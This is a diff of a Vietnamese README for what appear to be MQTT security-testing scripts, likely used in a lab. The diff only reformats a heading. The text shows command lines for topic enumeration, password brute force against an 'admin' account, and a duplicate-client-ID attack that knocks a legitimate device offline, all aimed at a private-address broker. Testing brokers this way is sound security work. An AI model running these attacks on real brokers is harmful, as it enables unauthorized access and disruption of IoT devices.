@@ -83,9 +83,8 @@ python Topic_Enumeration.py --broker 10.12.112.191 --port 8883 --username attack
 2. Brute Force (Dò mật khẩu nhanh) Tấn công đăng nhập liên tục với tốc độ cao.
 
 python Brute_Force.py --broker 10.12.112.191 --port 8883 --target-username "admin" --tls
-3. Duplicate Client ID (Trùng lặp ID) Ngắt kết nối thiết bị hợp lệ bằng cách sử dụng Client ID của nạn nhân.
 
-Bash
+3. Duplicate Client ID (Trùng lặp ID) Ngắt kết nối thiết bị hợp lệ bằng cách sử dụng Client ID của nạn nhân.
 
 python Duplicate_id.py --broker 10.12.112.191 --port 8883 --client-id "target_device" --username attacker --password 123
 
